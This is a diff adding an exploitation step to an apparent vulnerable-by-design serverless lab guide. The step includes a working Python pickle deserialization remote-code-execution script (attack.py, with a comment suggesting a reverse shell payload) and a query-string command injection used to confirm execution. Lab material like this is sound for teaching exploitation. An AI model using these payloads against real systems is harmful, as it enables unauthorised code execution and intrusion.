@@ -214,6 +214,66 @@ x-amzn-RequestId: 8e192cca-facc-4c8e-8ad2-07d1c599c854
 ```
 
 
+- Step 16:  To exploit python deserialization vulnerability part-1, run :
+	
+```
+$ python3
+>>> import pickle
+>>> import base64
+>>> obj = {'a': 1, 'b': 2}
+>>> data = pickle.dumps(obj)
+>>> b64data = base64.urlsafe_b64encode(data).decode()
+>>> print (b64data)
+gAN9cQAoWAEAAABhcQFLAVgBAAAAYnECSwJ1Lg==
+```
+
+Then run to validate if serialization is working or not
+    `http --form POST http://<sls-endpoint>/deserial pickled='gAN9cQAoWAEAAABhcQFLAVgBAAAAYnECSwJ1Lg=='`
+ 
+You will see an output like this
+ 
+ ```
+HTTP/1.0 200 OK
+Content-Length: 20
+Content-Type: text/html; charset=utf-8
+Date: Tue, 03 Jan 2023 15:30:42 GMT
+Server: Werkzeug/1.0.1 Python/3.8.16
+
+pickled successfully
+```
+	
+Then to exploit run the command from terminal:
+
+```
+cat <<EOF >>attack.py
+import pickle
+import base64
+import requests
+import sys
+
+class PickleRCE(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+#Change the url 
+default_url = 'http://<sls-endpoint>/deserial'
+url = sys.argv[1] if len(sys.argv) > 1 else default_url
+command = 'touch /tmp/hacked'  # Reverse Shell Payload Change IP/PORT
+
+pickled = 'pickled'  # This is the POST parameter of our vulnerable Flask app
+payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
+requests.post(url, data={pickled: payload})  # Sending POST request
+EOF	
+```
+	
+Then run attack.py to exploit, make sure to edit the lambda endpoint in attack.py script:
+	`python3 attack.py`
+
+Then to check the successfull execution:
+	`http get https://<sls-endpoint>/dev/date?exec=ls -la /tmp/`
+	
+
 - - -
 ## Destroy the Lab
 
